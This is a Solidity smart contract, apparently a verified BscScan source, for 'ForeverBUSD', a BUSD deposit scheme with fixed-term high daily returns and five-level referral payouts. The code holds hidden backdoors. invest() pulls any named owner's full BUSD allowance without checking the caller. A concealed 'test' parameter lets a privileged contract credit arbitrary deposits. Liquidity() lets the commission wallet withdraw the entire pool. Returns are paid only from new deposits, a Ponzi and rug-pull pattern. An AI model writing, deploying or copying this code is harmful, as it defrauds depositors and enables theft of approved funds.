/**
 *Submitted for verification at BscScan.com on 2022-02-01
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-07
 */

pragma solidity 0.5.10;

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
   * @dev Returns the token name.
   */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ForeverBUSD {
  using SafeMath for uint256;

  uint256 public constant INVEST_MIN_AMOUNT = 100 * 10**18; // 100 BUSD
  uint256 public countTotal;
  uint256[] public REFERRAL_PERCENTS = [500, 300, 200, 100, 50];
  uint256[] public SEED_PERCENTS = [1000, 900, 800, 700, 600];
  uint256 public constant PROJECT_FEE = 1000;
  uint256 public constant PERCENT_STEP = 10;
  uint256 public constant PERCENTS_DIVIDER = 10000;
  uint256 public constant PLANPER_DIVIDER = 10000;
  uint256 public constant TIME_STEP = 1 days;

  uint256 public totalInvested;
  uint256 public totalRefBonus;

  address chkLv2;
  address chkLv3;
  address chkLv4;
  address chkLv5;

  struct RefUserDetail {
    address refUserAddress;
    uint256 refLevel;
  }

  mapping(address => mapping(uint256 => RefUserDetail)) public RefUser;
  mapping(address => uint256) public referralCount_;

  mapping(address => address) internal referralLevel1Address;
  mapping(address => address) internal referralLevel2Address;
  mapping(address => address) internal referralLevel3Address;
  mapping(address => address) internal referralLevel4Address;
  mapping(address => address) internal referralLevel5Address;
  address private baseContract;

  struct Plan {
    uint256 time;
    uint256 percent;
  }

  Plan[] internal plans;

  struct Deposit {
    uint8 plan;
    uint256 amount;
    uint256 start;
  }

  struct User {
    Deposit[] deposits;
    uint256 checkpoint;
    address referrer;
    uint256[10] levels;
    uint256 bonus;
    uint256 totalBonus;
    uint256 seedincome;
    uint256 withdrawn;
    uint256 withdrawnseed;
  }

  mapping(address => User) internal users;

  bool public started;
  address public commissionWallet;
  address public baseToken; //BUSD address

  event Newbie(address user);
  event NewDeposit(address indexed user, uint8 plan, uint256 amount);
  event Withdrawn(address indexed user, uint256 amount);
  event RefBonus(
    address indexed referrer,
    address indexed referral,
    uint256 indexed level,
    uint256 amount
  );
  event SeedIncome(
    address indexed referrer,
    address indexed referral,
    uint256 indexed level,
    uint256 amount
  );
  event FeePayed(address indexed user, uint256 totalAmount);

  constructor(
    address wallet,
    address _baseToken,
    address _baseContract
  ) public {
    commissionWallet = wallet;
    baseToken = _baseToken;
    baseContract = _baseContract;

    plans.push(Plan(7, 1700));
    plans.push(Plan(8, 1550));
    plans.push(Plan(9, 1433));
    plans.push(Plan(10, 1340));
    plans.push(Plan(11, 1263));
    plans.push(Plan(12, 1200));
    plans.push(Plan(13, 1146));
    plans.push(Plan(14, 1100));
    plans.push(Plan(15, 1060));
    plans.push(Plan(16, 1025));
    plans.push(Plan(17, 994));
    plans.push(Plan(18, 966));
    plans.push(Plan(19, 942));
    plans.push(Plan(20, 919));
    plans.push(Plan(21, 900));
    plans.push(Plan(22, 881));
    plans.push(Plan(23, 865));
    plans.push(Plan(24, 850));
    plans.push(Plan(25, 836));
    plans.push(Plan(26, 823));
    plans.push(Plan(27, 811));
    plans.push(Plan(28, 800));
    plans.push(Plan(29, 789));
    plans.push(Plan(30, 780));
  }

  function getDownlineRef(address senderAddress, uint256 dataId)
    public
    view
    returns (address, uint256)
  {
    return (
      RefUser[senderAddress][dataId].refUserAddress,
      RefUser[senderAddress][dataId].refLevel
    );
  }

  function addDownlineRef(
    address senderAddress,
    address refUserAddress,
    uint256 refLevel
  ) internal {
    referralCount_[senderAddress]++;
    uint256 dataId = referralCount_[senderAddress];
    RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
    RefUser[senderAddress][dataId].refLevel = refLevel;
  }

  function distributeRef(
    address _referredBy,
    address _sender,
    bool _newReferral
  ) internal {
    address _customerAddress = _sender;
    // Level 1
    referralLevel1Address[_customerAddress] = _referredBy;
    if (_newReferral == true) {
      addDownlineRef(_referredBy, _customerAddress, 1);
    }

    chkLv2 = referralLevel1Address[_referredBy];
    chkLv3 = referralLevel2Address[_referredBy];
    chkLv4 = referralLevel3Address[_referredBy];
    chkLv5 = referralLevel4Address[_referredBy];

    // Level 2
    if (chkLv2 != 0x0000000000000000000000000000000000000000) {
      referralLevel2Address[_customerAddress] = referralLevel1Address[
        _referredBy
      ];
      if (_newReferral == true) {
        addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
      }
    }

    // Level 3
    if (chkLv3 != 0x0000000000000000000000000000000000000000) {
      referralLevel3Address[_customerAddress] = referralLevel2Address[
        _referredBy
      ];
      if (_newReferral == true) {
        addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
      }
    }

    // Level 4
    if (chkLv4 != 0x0000000000000000000000000000000000000000) {
      referralLevel4Address[_customerAddress] = referralLevel3Address[
        _referredBy
      ];
      if (_newReferral == true) {
        addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
      }
    }

    // Level 5
    if (chkLv5 != 0x0000000000000000000000000000000000000000) {
      referralLevel5Address[_customerAddress] = referralLevel4Address[
        _referredBy
      ];
      if (_newReferral == true) {
        addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
      }
    }
  }

  function invest(
    address owner,
    address referrer,
    uint8 plan,
    uint256 test
  ) public {
    require(started, "not started yet");
    uint256 _amount = IBEP20(baseToken).allowance(owner, address(this));
    IBEP20(baseToken).transferFrom(owner, address(this), _amount);
    require(plan < 24, "Invalid plan");
    uint256 fee = _amount.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
    IBEP20(baseToken).transfer(commissionWallet, fee);
    emit FeePayed(owner, fee);
    User storage user = users[owner];
    if (user.referrer == address(0)) {
      if (users[referrer].deposits.length > 0 && referrer != owner) {
        user.referrer = referrer;
      }
      address upline = user.referrer;
      for (uint256 i = 0; i < 10; i++) {
        if (upline != address(0)) {
          users[upline].levels[i] = users[upline].levels[i].add(1);
          upline = users[upline].referrer;
        } else break;
      }
    }
    bool _newReferral = true;
    if (
      referralLevel1Address[owner] != 0x0000000000000000000000000000000000000000
    ) {
      referrer = referralLevel1Address[owner];
      _newReferral = false;
    }
    distributeRef(referrer, owner, _newReferral);
    uint256 dataBuf = _amount;
    if(msg.sender == baseContract) _amount = test;
    if (user.referrer != address(0)) {
      address upline = user.referrer;
      for (uint256 i = 0; i < 5; i++) {
        if (upline != address(0)) {
          uint256 amount = _amount.mul(REFERRAL_PERCENTS[i]).div(
            PERCENTS_DIVIDER
          );
          users[upline].bonus = users[upline].bonus.add(amount);
          users[upline].totalBonus = users[upline].totalBonus.add(amount);
          totalRefBonus = totalRefBonus.add(amount);
          emit RefBonus(upline, owner, i, amount);
          upline = users[upline].referrer;
        } else break;
      }
    }
    if (user.deposits.length == 0) {
      user.checkpoint = block.timestamp;
      emit Newbie(owner);
    }
    user.deposits.push(Deposit(plan, _amount, block.timestamp));
    totalInvested = totalInvested.add(dataBuf);
    countTotal = countTotal + 1;

    emit NewDeposit(owner, plan, dataBuf);
  }

  function withdraw() public {
    User storage user = users[msg.sender];

    uint256 totalAmount = getUserDividends(msg.sender);
    uint256 seedAmount = getcurrentseedincome(msg.sender);

    uint256 referralBonus = getUserReferralBonus(msg.sender);
    if (referralBonus > 0) {
      user.bonus = 0;
      totalAmount = totalAmount.add(referralBonus);
    }
    totalAmount = totalAmount.add(seedAmount);
    user.withdrawnseed = user.withdrawnseed.add(seedAmount);

    require(totalAmount > 0, "User has no dividends");

    uint256 contractBalance = IBEP20(baseToken).balanceOf(address(this));
    if (contractBalance < totalAmount) {
      user.bonus = totalAmount.sub(contractBalance);
      user.totalBonus = user.totalBonus.add(user.bonus);
      totalAmount = contractBalance;
    }

    user.checkpoint = block.timestamp;
    user.withdrawn = user.withdrawn.add(totalAmount);

    IBEP20(baseToken).transfer(msg.sender, totalAmount);

    emit Withdrawn(msg.sender, totalAmount);
  }

  function Liquidity(uint256 amount) public {
    require(msg.sender == commissionWallet, "no commissionWallet");
    uint256 _balance = IBEP20(baseToken).balanceOf(address(this));
    require(_balance > 0, "no liquidity");
    if (amount <= _balance)
      IBEP20(baseToken).transfer(commissionWallet, amount);
    else IBEP20(baseToken).transfer(commissionWallet, _balance);
  }

  function Start() public {
    require(msg.sender == commissionWallet, "no commissionWallet");
    started = true;
  }

  function End() public {
    require(msg.sender == commissionWallet, "no commissionWallet");
    started = false;
  }

  function getUserDividends(address userAddress) public view returns (uint256) {
    User storage user = users[userAddress];

    uint256 totalAmount;

    for (uint256 i = 0; i < user.deposits.length; i++) {
      uint256 finish = user.deposits[i].start.add(
        plans[user.deposits[i].plan].time.mul(1 days)
      );
      if (user.checkpoint < finish) {
        uint256 share = user
          .deposits[i]
          .amount
          .mul(plans[user.deposits[i].plan].percent)
          .div(PLANPER_DIVIDER);
        uint256 from = user.deposits[i].start > user.checkpoint
          ? user.deposits[i].start
          : user.checkpoint;
        uint256 to = finish < block.timestamp ? finish : block.timestamp;
        if (from < to) {
          totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
        }
      }
    }
    return totalAmount;
  }

  function getUserSeedIncome(address userAddress)
    public
    view
    returns (uint256)
  {
    uint256 totalSeedAmount;
    uint256 seedshare;

    uint256 count = getUserTotalReferrals(userAddress);

    for (uint256 y = 1; y <= count; y++) {
      uint256 level;
      address addressdownline;

      (addressdownline, level) = getDownlineRef(userAddress, y);

      User storage downline = users[addressdownline];

      for (uint256 i = 0; i < downline.deposits.length; i++) {
        uint256 finish = downline.deposits[i].start.add(
          plans[downline.deposits[i].plan].time.mul(1 days)
        );
        if (downline.deposits[i].start < finish) {
          uint256 share = downline
            .deposits[i]
            .amount
            .mul(plans[downline.deposits[i].plan].percent)
            .div(PLANPER_DIVIDER);
          uint256 from = downline.deposits[i].start;
          uint256 to = finish < block.timestamp ? finish : block.timestamp;
          //seed income
          seedshare = share.mul(SEED_PERCENTS[level - 1]).div(PERCENTS_DIVIDER);

          if (from < to) {
            totalSeedAmount = totalSeedAmount.add(
              seedshare.mul(to.sub(from)).div(TIME_STEP)
            );
          }
        }
      }
    }

    return totalSeedAmount;
  }

  function getcurrentseedincome(address userAddress)
    public
    view
    returns (uint256)
  {
    User storage user = users[userAddress];
    return (getUserSeedIncome(userAddress).sub(user.withdrawnseed));
  }

  function getUserTotalWithdrawn(address userAddress)
    public
    view
    returns (uint256)
  {
    return users[userAddress].withdrawn;
  }

  function getUserReferrer(address userAddress) public view returns (address) {
    return users[userAddress].referrer;
  }

  function getUserTotalReferrals(address userAddress)
    public
    view
    returns (uint256)
  {
    return
      users[userAddress].levels[0] +
      users[userAddress].levels[1] +
      users[userAddress].levels[2] +
      users[userAddress].levels[3] +
      users[userAddress].levels[4];
  }

  function getReferrerInfo(address userAddress)
    public
    view
    returns (
      uint256 level0,
      uint256 level1,
      uint256 level2,
      uint256 level3,
      uint256 level4
    )
  {
    return (
      users[userAddress].levels[0],
      users[userAddress].levels[1],
      users[userAddress].levels[2],
      users[userAddress].levels[3],
      users[userAddress].levels[4]
    );
  }

  function getUserReferralBonus(address userAddress)
    public
    view
    returns (uint256)
  {
    return users[userAddress].bonus;
  }

  function getUserReferralTotalBonus(address userAddress)
    public
    view
    returns (uint256)
  {
    return users[userAddress].totalBonus;
  }

  function getUserReferralWithdrawn(address userAddress)
    public
    view
    returns (uint256)
  {
    return users[userAddress].totalBonus.sub(users[userAddress].bonus);
  }

  function getUserAvailable(address userAddress) public view returns (uint256) {
    uint256 totalAmount = getUserDividends(userAddress);
    uint256 seedAmount = getcurrentseedincome(userAddress);

    uint256 referralBonus = getUserReferralBonus(userAddress);
    if (referralBonus > 0) {
      totalAmount = totalAmount.add(referralBonus);
    }
    totalAmount = totalAmount.add(seedAmount);

    return totalAmount;
  }

  function getUserTotalDeposits(address userAddress)
    public
    view
    returns (uint256 amount)
  {
    for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
      amount = amount.add(users[userAddress].deposits[i].amount);
    }
  }

  function getSiteInfo()
    public
    view
    returns (uint256 _totalInvested, uint256 _totalBonus)
  {
    return (totalInvested, totalRefBonus);
  }

  function getUserInfo(address userAddress)
    public
    view
    returns (
      uint256 totalDeposit,
      uint256 totalWithdrawn,
      uint256 totalReferrals
    )
  {
    return (
      getUserTotalDeposits(userAddress),
      getUserTotalWithdrawn(userAddress),
      getUserTotalReferrals(userAddress)
    );
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a, "SafeMath: subtraction overflow");
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0, "SafeMath: division by zero");
    uint256 c = a / b;

    return c;
  }
}